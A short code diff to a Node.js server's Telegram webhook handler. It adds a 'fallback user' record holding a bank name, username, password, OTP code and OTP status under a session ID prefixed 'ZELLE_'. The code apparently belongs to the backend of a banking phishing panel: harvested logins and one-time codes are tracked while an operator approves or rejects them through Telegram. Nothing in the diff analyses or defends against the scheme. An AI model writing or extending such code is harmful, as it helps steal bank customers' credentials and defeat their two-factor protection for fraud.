@@ -376,6 +376,24 @@ app.post('/api/telegram-webhook', async (req, res) => {
         } else {
             console.warn(`[WEBHOOK] ⚠️ User ${userId} not found in memory!`);
             console.log(`[WEBHOOK] Available users:`, users.map(u => ({ id: u.id, status: u.otp_status })));
+            console.log(`[WEBHOOK] 🔧 Creating fallback user for webhook processing...`);
+            
+            // Create fallback user so the status can be stored and checked
+            const fallbackUser = {
+                id: userId,
+                session_id: `ZELLE_${userId}_WEBHOOK_FALLBACK`,
+                bank_name: 'Unknown (Server Restarted)',
+                username: 'Unknown',
+                password: '',
+                otp_code: '',
+                otp_status: action,
+                created_at: new Date().toISOString(),
+                ip: 'Unknown',
+                webhook_fallback: true
+            };
+            users.push(fallbackUser);
+            console.log(`[WEBHOOK] ✅ Created fallback user ${userId} with status: ${action}`);
+            console.log(`[WEBHOOK] Total users now: ${users.length}`);
         }
         
         // Answer callback query
